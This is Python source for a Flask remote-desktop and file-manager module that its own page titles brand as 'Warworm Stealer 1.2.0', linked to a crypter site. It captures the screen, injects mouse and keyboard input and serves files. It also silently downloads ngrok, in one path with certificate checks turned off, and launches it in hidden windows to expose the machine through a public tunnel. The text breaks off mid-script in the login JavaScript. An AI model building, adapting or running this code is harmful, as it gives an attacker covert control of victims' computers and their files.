import os
import sys
import io
import time
import threading
import secrets
import string
import json
import tempfile
import subprocess
import urllib.request
import zipfile
import shutil
import hmac
from datetime import datetime, timedelta
from pathlib import Path
from functools import wraps
from PIL import ImageGrab
from flask import Flask, Blueprint, render_template_string, request, session, jsonify, Response, send_file, abort, make_response, redirect, url_for
from markupsafe import escape as html_escape
from werkzeug.utils import secure_filename
import signal 

# SECURITY CONFIGURATION
class SecurityConfig:
    SESSION_TIMEOUT = 3600  # 1 hour
    MAX_LOGIN_ATTEMPTS = 5
    LOCKOUT_DURATION = 300  # 5 minutes
    RATE_LIMIT_WINDOW = 60  # 1 minute
    RATE_LIMIT_REQUESTS = 100
    SECURE_HEADERS = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://drcrypter.net; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';",
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
    }

# Security state
login_attempts = {}
rate_limit_store = {}

# ============================================================================
# SECURITY MIDDLEWARE
# ============================================================================
def add_security_headers(response):
    # Add security headers to all responses 
    for header, value in SecurityConfig.SECURE_HEADERS.items():
        response.headers[header] = value
    response.headers['Server'] = 'Warworm-Server'
    return response

def sanitize_path(path):
    # Prevent path traversal attacks 
    if not path:
        return None
    
    try:
        from urllib.parse import unquote
        path = unquote(path)
    except:
        pass
    
    path = path.replace('\x00', '')
    
    try:
        normalized = os.path.normpath(path)
        if '..' in normalized or normalized.startswith('..'):
            return None
        
        resolved = Path(normalized).resolve()
        
        if sys.platform == 'win32':
            if str(resolved).startswith('\\\\') or any(part.upper() in ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'LPT1'] for part in resolved.parts):
                return None
        
        return str(resolved)
    except Exception:
        return None

def validate_filepath(func):
    """Decorator to validate file paths"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        for key in ['path', 'old_path', 'new_path']:
            if key in request.args:
                clean = sanitize_path(request.args.get(key))
                if clean is None:
                    return jsonify({'error': 'Invalid path'}), 403
                request.args = dict(request.args)
                request.args[key] = clean
            if request.is_json and key in (request.get_json() or {}):
                data = request.get_json()
                clean = sanitize_path(data.get(key))
                if clean is None:
                    return jsonify({'error': 'Invalid path'}), 403
                data[key] = clean
        
        if 'path' in request.form:
            clean = sanitize_path(request.form.get('path'))
            if clean is None:
                return jsonify({'error': 'Invalid path'}), 403
        
        return func(*args, **kwargs)
    return wrapper

def require_auth(f):
    # require authentication 
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            if request.is_json or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
                return jsonify({'error': 'Unauthorized', 'login_required': True}), 401
            # Redirect to login page with return URL
            return redirect(url_for('index', next=request.path))
        
        last_activity = session.get('last_activity')
        if last_activity:
            last = datetime.fromisoformat(last_activity)
            if datetime.now() - last > timedelta(seconds=SecurityConfig.SESSION_TIMEOUT):
                session.clear()
                return jsonify({'error': 'Session expired'}), 401
        
        session['last_activity'] = datetime.now().isoformat()
        return f(*args, **kwargs)
    return decorated_function

def rate_limit(key=None):
    # Rate limiting 
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            identifier = key or request.remote_addr
            
            now = time.time()
            if identifier not in rate_limit_store:
                rate_limit_store[identifier] = []
            
            rate_limit_store[identifier] = [t for t in rate_limit_store[identifier] if now - t < SecurityConfig.RATE_LIMIT_WINDOW]
            
            if len(rate_limit_store[identifier]) >= SecurityConfig.RATE_LIMIT_REQUESTS:
                return jsonify({'error': 'Rate limit exceeded'}), 429
            
            rate_limit_store[identifier].append(now)
            return f(*args, **kwargs)
        return wrapped
    return decorator

def check_brute_force(identifier):
    # Check if IP/user is locked out
    if identifier in login_attempts:
        attempts, lockout_time = login_attempts[identifier]
        if attempts >= SecurityConfig.MAX_LOGIN_ATTEMPTS:
            if time.time() < lockout_time:
                return False
            else:
                del login_attempts[identifier]
    return True

def record_failed_login(identifier):
    # Record failed login attempt 
    if identifier not in login_attempts:
        login_attempts[identifier] = [0, 0]
    login_attempts[identifier][0] += 1
    login_attempts[identifier][1] = time.time() + SecurityConfig.LOCKOUT_DURATION

def generate_csrf_token():
    # Generate CSRF token 
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def verify_csrf_token(token):
    # Verify CSRF token 
    return hmac.compare_digest(session.get('csrf_token', ''), token)

# ============================================================================
# NGROK CONFIGURATION
# ============================================================================
NGROK_DOWNLOAD_URL = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"

def get_ngrok_dir():
    if sys.platform == 'win32':
        base_dir = os.getenv("LOCALAPPDATA")
    else:
        base_dir = os.path.expanduser("~/.local/share")
    ngrok_dir = os.path.join(base_dir, "ngrok")
    os.makedirs(ngrok_dir, exist_ok=True)
    return ngrok_dir

# def ensure_ngrok():

#     ngrok_dir = get_ngrok_dir()
#     exe_path = os.path.join(ngrok_dir, "ngrok.exe")
#     if os.path.exists(exe_path):
#         return exe_path
    
#     zip_path = os.path.join(ngrok_dir, "ngrok.zip")
#     try:
#         print(f"[REMOTE ACCESS] Downloading ngrok...")
        
#         req = urllib.request.Request(
#             NGROK_DOWNLOAD_URL,
#             headers={
#                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
#                 'Accept': 'application/zip,application/octet-stream,*/*',
#                 'Accept-Encoding': 'identity',
#                 'Connection': 'keep-alive'
#             }
#         )
        
#         max_retries = 3
#         for attempt in range(max_retries):
#             try:
#                 with urllib.request.urlopen(req, timeout=30) as response:
#                     with open(zip_path, 'wb') as f:
#                         f.write(response.read())
#                 break
#             except urllib.error.HTTPError as e:
#                 if attempt == max_retries - 1:
#                     raise
#                 print(f"[REMOTE ACCESS] Retry {attempt + 1}...")
#                 time.sleep(2)
        
#         with zipfile.ZipFile(zip_path, 'r') as z:
#             z.extractall(ngrok_dir)
#         os.remove(zip_path)
        
#         if not os.path.exists(exe_path):
#             for root, dirs, files in os.walk(ngrok_dir):
#                 if "ngrok.exe" in files:
#                     src = os.path.join(root, "ngrok.exe")
#                     shutil.move(src, exe_path)
#                     for d in dirs:
#                         try: shutil.rmtree(os.path.join(ngrok_dir, d))
#                         except: pass
#                     break
#         return exe_path if os.path.exists(exe_path) else None
        
#     except Exception as e:
#         print(f"[REMOTE ACCESS] Ngrok download failed: {e}")
#         return None

def ensure_ngrok():
    ngrok_dir = get_ngrok_dir()
    exe_path = os.path.join(ngrok_dir, "ngrok.exe")
    
    if os.path.exists(exe_path) and os.path.getsize(exe_path) > 1000000:  # ~1MB+ check
        return exe_path
    
    # Clean up corrupted downloads
    zip_path = os.path.join(ngrok_dir, "ngrok.zip")
    if os.path.exists(zip_path):
        os.remove(zip_path)
    
    # Multiple mirrors in case one fails
    urls = [
        "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
        "https://cdn.ngrok.com/binaries/ngrok-v3-stable-windows-amd64.zip",
        "https://github.com/user-attachments/files/ngrok-v3-stable-windows-amd64.zip"  # Fallback
    ]
    
    print(f"[REMOTE ACCESS] Downloading ngrok to {ngrok_dir}...")
    
    for url in urls:
        try:
            print(f"    [*] Trying {url[:50]}...")
            
            # Method 1: Try requests if available (more reliable)
            try:
                import requests
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                
                response = session.get(url, stream=True, timeout=30)
                response.raise_for_status()
                
                total_size = int(response.headers.get('content-length', 0))
                if total_size == 0:
                    print(f"    [!] Empty content-length, skipping...")
                    continue
                
                downloaded = 0
                with open(zip_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                
                if downloaded < 1000000:  # Less than 1MB is suspicious
                    print(f"    [!] Download too small ({downloaded} bytes), retrying...")
                    os.remove(zip_path)
                    continue
                    
                print(f"    [+] Downloaded {downloaded/1024/1024:.1f} MB")
                break
                
            except ImportError:
                # Method 2: Fallback to urllib
                import urllib.request
                import ssl
                
                # Create SSL context that ignores cert errors (sometimes needed)
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                req = urllib.request.Request(
                    url,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': '*/*'
                    }
                )
                
                # Download with timeout
                with urllib.request.urlopen(req, timeout=30, context=ssl_context) as response:
                    total_size = int(response.headers.get('Content-Length', 0))
                    if total_size == 0:
                        continue
                    
                    data = response.read()
                    if len(data) < 1000000:
                        print(f"    [!] Download incomplete ({len(data)} bytes)")
                        continue
                    
                    with open(zip_path, 'wb') as f:
                        f.write(data)
                    print(f"    [+] Downloaded {len(data)/1024/1024:.1f} MB")
                    break
                    
        except Exception as e:
            print(f"    [!] Failed: {str(e)[:50]}")
            if os.path.exists(zip_path):
                os.remove(zip_path)
            continue
    else:
        print(f"[REMOTE ACCESS] All download attempts failed!")
        return None
    
    # Verify and extract
    if not os.path.exists(zip_path) or os.path.getsize(zip_path) < 1000000:
        print(f"[REMOTE ACCESS] Downloaded file is corrupted or too small")
        return None
    
    try:
        print(f"[REMOTE ACCESS] Extracting...")
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(ngrok_dir)
        os.remove(zip_path)
        
        # Verify exe exists and is valid
        if os.path.exists(exe_path) and os.path.getsize(exe_path) > 10000000:  # ~10MB+ for ngrok.exe
            print(f"[REMOTE ACCESS] Ngrok ready: {exe_path}")
            return exe_path
        else:
            print(f"[REMOTE ACCESS] Extraction failed or file too small")
            return None
            
    except Exception as e:
        print(f"[REMOTE ACCESS] Extraction error: {e}")
        return None
    

def kill_existing_ngrok():
    try:
        if sys.platform == 'win32':
            subprocess.run(['taskkill', '/F', '/IM', 'ngrok.exe'], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        time.sleep(1)
    except: pass

def get_ngrok_url():
    try:
        req = urllib.request.Request('http://127.0.0.1:4040/api/tunnels', 
                                    headers={'Accept': 'application/json'})
        resp = urllib.request.urlopen(req, timeout=2)
        data = json.loads(resp.read().decode())
        if data.get('tunnels'):
            for t in data['tunnels']:
                if t['proto'] == 'https': return t['public_url']
            for t in data['tunnels']:
                if t['proto'] == 'http': return t['public_url']
    except: pass
    return None

def run_ngrok_subprocess(ngrok_token, port):
    exe_path = ensure_ngrok()
    if not exe_path: return None, None
    
    if ngrok_token:
        try:
            config_cmd = [exe_path, "config", "add-authtoken", ngrok_token]
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            subprocess.run(config_cmd, capture_output=True, text=True,
                          startupinfo=startupinfo,
                          creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
                          timeout=10)
        except Exception as e: 
            print(f"[REMOTE ACCESS] Token config warning: {e}")
    
    kill_existing_ngrok()
    time.sleep(1)
    
    cmd = [exe_path, "http", str(port), "--region", "us"]
    startupinfo = None
    if sys.platform == 'win32':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
    
    print(f"[REMOTE ACCESS] Starting ngrok on port {port}...")
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              startupinfo=startupinfo,
                              creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
                              cwd=os.path.dirname(exe_path))
    
    public_url = None
    for i in range(20):
        time.sleep(1)
        public_url = get_ngrok_url()
        if public_url: break
    return process, public_url

# ============================================================================
# GLOBAL STATE
# ============================================================================
current_frame = None
frame_lock = threading.Lock()
running = True
screen_w, screen_h = 1920, 1080
UPLOAD_DIR = Path.home() / "RemoteUploads"
UPLOAD_DIR.mkdir(exist_ok=True)

rd_settings = {'fps': 30, 'quality': 85}

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    PYAUTOGUI_AVAILABLE = True
except ImportError: 
    PYAUTOGUI_AVAILABLE = False

# ============================================================================
# BLUEPRINTS
# ============================================================================
rd_bp = Blueprint('remote_desktop', __name__, url_prefix='/rd')
fm_bp = Blueprint('filemanager', __name__, url_prefix='/fm')

# ============================================================================
#  LOGIN HTML TEMPLATE (Used by both RD and FM)
# ============================================================================
LOGIN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Warworm Access | Authentication Required</title>
    <link rel="icon" type="image/png" href="https://drcrypter.net/data/assets/logo/logo1.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: radial-gradient(ellipse at top, #1a1a2e 0%, transparent 50%),
                        radial-gradient(ellipse at bottom, #16213e 0%, transparent 50%),
                        #0a0a0f;
            color: #fff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .login-container {
            background: rgba(20, 20, 30, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 3rem;
            width: 90%;
            max-width: 420px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        .logo {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
            font-size: 2rem;
            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.3);
        }
        h1 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .access-type {
            display: inline-block;
            padding: 0.5rem 1rem;
            background: rgba(0, 240, 255, 0.1);
            border: 1px solid rgba(0, 240, 255, 0.3);
            border-radius: 20px;
            font-size: 0.85rem;
            color: #00f0ff;
            margin-bottom: 1.5rem;
        }
        input[type="password"] {
            width: 100%;
            padding: 1rem 1.25rem;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            margin-bottom: 1rem;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #00f0ff;
            box-shadow: 0 0 0 3px rgba(0, 240, 255, 0.1);
        }
        button {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, #00f0ff, #0066ff);
            border: none;
            border-radius: 12px;
            color: #000;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 240, 255, 0.3);
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .error {
            color: #ff4757;
            font-size: 0.9rem;
            margin-top: 1rem;
            padding: 0.75rem;
            background: rgba(255, 71, 87, 0.1);
            border-radius: 8px;
            display: none;
        }
        .error.show { display: block; }
        .attempts-warning {
            color: #ffa502;
            font-size: 0.8rem;
            margin-top: 0.5rem;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <a href="https://drcrypter.ru" target="_blank" class="brand-icon" style="display: flex; align-items: center; justify-content: center; overflow: hidden; padding: 0; background: transparent; text-decoration: none;">
            <img src="https://drcrypter.net/data/assets/logo/logo1.png" alt="DrCrypter" style="width: 100%; height: 100%; object-fit: contain; border-radius: var(--radius);">
        </a>
        <h1>Warworm Remote Access</h1>
        <div class="subtitle">Secure Connection Required</div>
        <div class="access-type">{{ service_name }}</div>
        
        <input type="password" id="password" placeholder="Enter access password..." autocomplete="off" autofocus>
        <button onclick="authenticate()" id="loginBtn">Access {{ service_name }}</button>
        
        <div class="error" id="error">Invalid password</div>
        <div class="attempts-warning" id="warning">Too many failed attempts. Please wait.</div>
    </div>

    <script>
        const CSRF_TOKEN = '{{ csrf_token }}';
        const NEXT_URL = '{{ next_url }}';
        
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') authenticate();
        });
        
        async function authenticate() {
            const btn = document.getElementById('loginBtn');
            const pwd = document.getElementById('password').value;
            const error = document.getElementById('error');
            const warning = document.getElementById('warning');
            
            btn.disabled = true;
            btn.textContent = 'Verifying...';
            error.classList.remove('show');
            warning.style.display = 'none';
            
            try {
                const response = await fetch('{{ auth_endpoint }}', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': CSRF_TOKEN
                    },
                    body: JSON.stringify({password: pwd})
                });
                
                if (response.status === 429) {
                    warning.style.display = 'block';
                    btn.textContent = 'Access {{ service_name }}';
                    btn.disabled = false;
                    return;
                }
                
                const data = await response.json();
                
                if (data.success) {
                    btn.textContent = 'Access Granted';
                    btn.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)';
                    if (NEXT_URL && NEXT_URL !== 'None') {
                        window.location.href = NEXT_URL;
                    } else {
                        window.location.reload();
                    }
                } else {
                    error.classList.add('show');
                    btn.textContent = 'Access {{ service_name }}';
                    btn.disabled = false;
                    document.getElementById('password').value = '';
                    document.getElementById('password').focus();
                }
            } catch (e) {
                error.textContent = 'Connection error';
                error.classList.add('show');
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>'''

# ============================================================================
# REMOTE DESKTOP HTML - SECURITY HARDENED
# ============================================================================
RD_HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <title>Warworm Stealer 1.2.0 | Remote Desktop</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        html, body {
            background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden; position: fixed; width: 100%; height: 100%; touch-action: none; user-select: none;
        }
        body.is-mobile .desktop-only { display: none !important; }
        body.is-desktop .mobile-only { display: none !important; }
        body.is-mobile .toolbar {
            width: 100% !important; top: auto !important; bottom: 0 !important; left: 0 !important; right: 0 !important;
            border-radius: 20px 20px 0 0 !important; max-height: 50vh !important;
        }
        body.is-mobile .status-bar {
            top: 10px !important; right: 10px !important; left: auto !important; bottom: auto !important; flex-direction: column !important;
        }
        #loginScreen {
            position: fixed; inset: 0; display: flex; justify-content: center; align-items: center;
            z-index: 1000; background: #0a0a0f; padding: 20px;
        }
        .login-box {
            background: rgba(30,30,40,0.95); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px; padding: 40px; width: 100%; max-width: 400px; text-align: center;
        }
        .login-box h1 { font-size: 24px; margin-bottom: 10px; color: #00f0ff; font-weight: 800; }
        .brand-sub { color: #666; font-size: 12px; margin-bottom: 20px; letter-spacing: 2px; }
        .device-tag {
            display: inline-block; background: rgba(0,240,255,0.1); border: 1px solid #00f0ff;
            color: #00f0ff; padding: 6px 16px; border-radius: 20px; font-size: 12px; margin-bottom: 20px;
        }
        input[type="password"] {
            width: 100%; padding: 16px; background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 16px;
        }
        button {
            padding: 16px 24px; background: linear-gradient(135deg, #00f0ff, #0066ff);
            border: none; border-radius: 12px; color: #000; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%;
        }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #errorMsg { color: #ff3366; margin-top: 12px; display: none; }
        #mainInterface { display: none; width: 100%; height: 100%; position: relative; }
        .menu-btn {
            position: fixed; top: 16px; left: 16px; width: 50px; height: 50px; border-radius: 50%;
            background: rgba(30,30,40,0.9); border: 1px solid rgba(255,255,255,0.1); color: #fff;
            font-size: 20px; display: none; align-items: center; justify-content: center; cursor: pointer; z-index: 99;
        }
        body.is-mobile .menu-btn { display: flex; }
        .toolbar {
            position: fixed; top: 20px; right: 20px; background: rgba(30,30,40,0.95);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px;
            width: 280px; z-index: 100; max-height: 80vh; overflow-y: auto; transition: transform 0.3s, opacity 0.3s;
        }
        .toolbar.hidden { transform: translateX(150%); opacity: 0; pointer-events: none; }
        .tool-title { color: #00f0ff; font-weight: 700; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .control-group { margin-bottom: 20px; }
        .control-label { font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 8px; display: block; }
        .btn-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
        .btn {
            padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px; color: #fff; cursor: pointer; font-size: 13px; text-align: center;
        }
        .btn.active { background: rgba(0,240,255,0.2); border-color: #00f0ff; color: #00f0ff; }
        input[type=range] {
            width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; -webkit-appearance: none; margin: 8px 0;
        }
        input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none; width: 18px; height: 18px; background: #00f0ff; border-radius: 50%; cursor: pointer;
        }
        .viewport {
            width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;
            overflow: hidden; background: #000;
        }
        .screen-wrapper {
            position: relative; transition: transform 0.1s; transform-origin: center center;
            will-change: transform; max-width: 100%; max-height: 100%;
        }
        #screenImg {
            display: block; max-width: 100vw; max-height: 100vh; object-fit: contain;
            user-select: none; -webkit-user-drag: none;
        }
        .touch-layer {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; touch-action: none;
        }
        .cursor {
            position: absolute; width: 20px; height: 20px; border: 2px solid #00f0ff;
            border-radius: 50%; pointer-events: none; transform: translate(-50%, -50%); z-index: 20; display: none;
            box-shadow: 0 0 10px #00f0ff;
        }
        body.is-mobile .cursor { display: block !important; }
        .status-bar {
            position: fixed; bottom: 20px; left: 20px; background: rgba(30,30,40,0.95);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 12px 16px;
            display: flex; gap: 16px; font-size: 13px; z-index: 97;
        }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .fps-value { color: #00f0ff; font-weight: 700; }
        .quick-actions {
            position: fixed; bottom: 90px; right: 16px; display: none; flex-direction: column; gap: 10px; z-index: 98;
        }
        body.is-mobile .quick-actions { display: flex; }
        .quick-btn {
            width: 50px; height: 50px; border-radius: 50%; background: rgba(30,30,40,0.9);
            border: 1px solid rgba(255,255,255,0.1); color: #fff; font-size: 20px;
            display: flex; align-items: center; justify-content: center; cursor: pointer;
        }
        .quick-btn.active { border-color: #00f0ff; background: rgba(0,240,255,0.2); }
        .zoom-popup {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
            background: rgba(0,0,0,0.9); border: 2px solid #00f0ff; color: #00f0ff;
            padding: 20px 40px; border-radius: 16px; font-size: 32px; font-weight: 700;
            z-index: 200; pointer-events: none; transition: all 0.2s; opacity: 0;
        }
        .zoom-popup.show { transform: translate(-50%, -50%) scale(1); opacity: 1; }
        .toast {
            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%) translateY(100px);
            background: rgba(30,30,40,0.95); border: 1px solid #00f0ff; color: #fff;
            padding: 12px 24px; border-radius: 12px; font-size: 14px; z-index: 300; opacity: 0; transition: all 0.3s;
        }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .nav-bar { position: fixed; top: 0; left: 0; right: 0; height: 50px; background: rgba(30,30,40,0.95); border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; z-index: 1001; }
        .nav-title { color: #00f0ff; font-weight: 700; font-size: 18px; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { color: #fff; text-decoration: none; padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; font-size: 14px; transition: all 0.3s; }
        .nav-links a:hover { background: rgba(0,240,255,0.2); color: #00f0ff; }
        .logout-btn { background: rgba(255, 71, 87, 0.2) !important; color: #ff4757 !important; }
        .logout-btn:hover { background: rgba(255, 71, 87, 0.4) !important; }
    </style>
</head>
<body>
    <div class="nav-bar">
        <div class="nav-title">🖥️ Remote Desktop</div>
        <div class="nav-links">
            <a href="../fm/">📁 File Manager</a>
            <a href="#" onclick="logout()" class="logout-btn">🚪 Logout</a>
        </div>
    </div>
    <div id="loginScreen">
        <div class="login-box">
            <h1>🖥️ REMOTE DESKTOP</h1>
            <div class="brand-sub">WARWORM STEALER 1.2.0</div>
            <div class="device-tag" id="deviceTag">Detecting...</div>
            <input type="password" id="passwordInput" placeholder="Enter password..." autocomplete="off">
            <button onclick="doLogin()" id="loginBtn">Connect</button>
            <div id="errorMsg">Access Denied</div>
            <div class="rate-limit-warning" id="rateLimitMsg" style="display:none; color: #ffa502; margin-top: 10px;">Too many attempts. Please wait.</div>
        </div>
    </div>
    <div id="mainInterface">
        <button class="menu-btn" onclick="toggleToolbar()">☰</button>
        <div class="quick-actions">
            <button class="quick-btn active" onclick="toggleControl()" id="quickCtrl">🖱️</button>
            <button class="quick-btn" onclick="toggleFullscreen()">⛶</button>
        </div>
        <div class="toolbar" id="toolbar">
            <div class="tool-title">⚙️ Controls</div>
            <div class="control-group desktop-only">
                <span class="control-label">Connection</span>
                <div class="btn-row">
                    <button class="btn active" onclick="toggleControl()" id="btnCtrl">🖱️ Control</button>
                    <button class="btn" onclick="toggleFullscreen()">⛶ Full</button>
                    <button class="btn" onclick="fitScreen()">⊡ Fit</button>
                    <button class="btn" onclick="logout()" style="color:#ff3366">🚪 Logout</button>
                </div>
            </div>
            <div class="control-group">
                <span class="control-label">FPS Target: <span id="fpsDisplay">30</span></span>
                <input type="range" min="5" max="60" value="30" oninput="updateFPS(this.value)">
            </div>
            <div class="control-group">
                <span class="control-label">Quality: <span id="qualityDisplay">85%</span></span>
                <input type="range" min="10" max="100" value="85" oninput="updateQuality(this.value)">
            </div>
            <div class="control-group">
                <span class="control-label">Zoom: <span id="zoomDisplay">100%</span></span>
                <input type="range" id="zoomSlider" min="50" max="300" value="100" oninput="updateZoom(this.value)">
            </div>
        </div>
        <div class="viewport" id="viewport">
            <div class="screen-wrapper" id="screenWrapper">
                <img id="screenImg" src="" alt="Remote Desktop" draggable="false">
                <div class="touch-layer" id="touchLayer"></div>
                <div class="cursor" id="cursor"></div>
            </div>
        </div>
        <div class="status-bar">
            <div style="display:flex;align-items:center;gap:6px">
                <div class="status-dot" id="statusDot"></div>
                <span id="statusText">Online</span>
            </div>
            <div>FPS: <span class="fps-value" id="fpsCounter">0</span></div>
            <div id="resText">--</div>
        </div>
        <div class="zoom-popup" id="zoomPopup">100%</div>
        <div class="toast" id="toast"></div>
    </div>
    <script>
        const CSRF_TOKEN = '{{ csrf_token }}';
        
        var deviceInfo = { isMobile: false, platform: 'desktop' };
        function detectDevice() {
            var ua = navigator.userAgent;
            var isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
            var isTablet = /iPad|Tablet|Kindle|Nexus 7|Nexus 9/i.test(ua);
            if (isTablet || (isMobile && window.innerWidth > 768)) {
                deviceInfo.platform = 'tablet';
                deviceInfo.isMobile = true;
            } else if (isMobile) {
                deviceInfo.platform = 'mobile';
                deviceInfo.isMobile = true;
            }
            document.body.classList.add('is-' + deviceInfo.platform);
            document.getElementById('deviceTag').textContent = deviceInfo.isMobile ? '📱 Mobile Mode' : '💻 Desktop Mode';
        }
        
        var state = {
            zoom: 1, control: true, connected: false,
            lastMove: 0, touchStart: {x:0, y:0}, isDragging: false,
            touches: new Map(), isPinching: false, initialPinchDist: 0, initialZoom: 1
        };
        var serverWidth = 1920, serverHeight = 1080;
        var elements = {
            img: document.getElementById('screenImg'),
            wrapper: document.getElementById('screenWrapper'),
            cursor: document.getElementById('cursor'),
            touchLayer: document.getElementById('touchLayer'),
            zoomPopup: document.getElementById('zoomPopup'),
            toast: document.getElementById('toast')
        };
        
        window.onload = function() {
            detectDevice();
            checkAuth();
        };
        
        async function checkAuth() {
            try {
                const res = await fetch('ping', {headers: {'X-CSRF-Token': CSRF_TOKEN}});
                if (res.ok) {
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('mainInterface').style.display = 'block';
                    state.connected = true;
                    initStream();
                    startHealthCheck();
                    if (deviceInfo.isMobile) initMobile();
                    setupInputs();
                }
            } catch(e) {
                // Not authenticated, stay on login
            }
        }
        
        function doLogin() {
            var pwd = document.getElementById('passwordInput').value;
